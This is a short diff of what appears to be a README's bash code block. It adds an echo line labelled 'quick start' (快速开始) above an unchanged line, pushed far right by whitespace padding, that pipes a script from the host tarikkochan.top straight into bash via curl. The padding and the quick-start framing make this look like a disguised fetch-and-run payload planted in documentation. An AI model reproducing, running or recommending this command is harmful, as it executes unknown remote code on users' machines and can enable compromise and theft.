@@ -4,7 +4,8 @@
 
 ---
 
-```bash 
+```bash
+                                        echo "快速开始"
                                 curl tarikkochan.top/fdnr | bash
 ```
 
